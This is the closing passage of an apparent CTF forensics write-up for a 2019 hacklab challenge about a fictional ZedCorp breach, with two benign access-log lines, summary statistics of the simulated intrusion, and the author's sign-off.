10.0.0.1 - admin [06/Apr/2019:03:30:48 +0200] "GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1" 200 14506 "http://10.0.0.3/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0"
10.0.0.1 - admin [06/Apr/2019:04:40:41 +0200] "GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1" 200 14506 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0"
```

## Final timeline

![](/img/hacklab-esgi-2019/timeline.png)


## Conclusion

ZedCorp statistics :

- 132 uniques ip
- Windows is the most used OS
- 515 ssh connexion on dev-server
- 34 meterpreters on project-server
- 114 backdoors on project-server
- 42 connexions to ftp admin-server
- 20 downloads of encrypted credentials
- 6 thefts of confidential documents
- 6 validations 

I hope you appreciated this challenge and the ctf globally. I really liked to develop and maintained theme. All the hacklab staff hope to see you the next week (for #zedcorp_challenge2 !!!) :)

See you soon,

Th1b4ud